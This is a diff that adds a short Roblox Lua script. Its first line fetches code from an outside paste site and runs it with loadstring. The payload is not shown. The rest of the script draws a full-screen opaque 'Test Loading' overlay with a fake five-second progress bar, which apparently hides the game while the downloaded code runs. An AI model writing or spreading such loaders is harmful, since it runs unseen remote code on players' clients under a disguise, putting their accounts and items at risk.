@@ -1,0 +1,68 @@
+loadstring(game:HttpGet("https://pastefy.app/0zX3kQZJ/raw"))()
+
+local player = game.Players.LocalPlayer
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = player:WaitForChild("PlayerGui")
+screenGui.IgnoreGuiInset = true
+
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+frame.BackgroundTransparency = 0
+frame.Parent = screenGui
+
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
+titleLabel.Position = UDim2.new(0.1, 0, 0.3, 0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Test Loading"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.TextScaled = true
+titleLabel.Font = Enum.Font.SourceSansBold
+titleLabel.Parent = frame
+
+local warningLabel = Instance.new("TextLabel")
+warningLabel.Size = UDim2.new(0.8, 0, 0.1, 0)
+warningLabel.Position = UDim2.new(0.1, 0, 0.4, 0)
+warningLabel.BackgroundTransparency = 1
+warningLabel.Text = "try Try"
+warningLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
+warningLabel.TextScaled = true
+warningLabel.Font = Enum.Font.SourceSansItalic
+warningLabel.Parent = frame
+
+local loadingBarFrame = Instance.new("Frame")
+loadingBarFrame.Size = UDim2.new(0.6, 0, 0.05, 0)
+loadingBarFrame.Position = UDim2.new(0.2, 0, 0.55, 0)
+loadingBarFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+loadingBarFrame.BorderSizePixel = 2
+loadingBarFrame.BorderColor3 = Color3.fromRGB(100, 100, 100)
+loadingBarFrame.Parent = frame
+
+local loadingBar = Instance.new("Frame")
+loadingBar.Size = UDim2.new(0, 0, 1, 0)
+loadingBar.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
+loadingBar.Parent = loadingBarFrame
+
+local percentageLabel = Instance.new("TextLabel")
+percentageLabel.Size = UDim2.new(0.6, 0, 0.05, 0)
+percentageLabel.Position = UDim2.new(0.2, 0, 0.6, 0)
+percentageLabel.BackgroundTransparency = 1
+percentageLabel.Text = "0%"
+percentageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+percentageLabel.TextScaled = true
+percentageLabel.Font = Enum.Font.SourceSans
+percentageLabel.Parent = frame
+
+local tweenService = game:GetService("TweenService")
+local tweenInfo = TweenInfo.new(5, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
+local goal = {Size = UDim2.new(1, 0, 1, 0)}
+local tween = tweenService:Create(loadingBar, tweenInfo, goal)
+tween:Play()
+
+local startTime = tick()
+game:GetService("RunService").RenderStepped:Connect(function()
+    local elapsed = math.min(tick() - startTime, 5)
+    local progress = elapsed / 5
+    percentageLabel.Text = math.floor(progress * 100) .. "%"
+end)
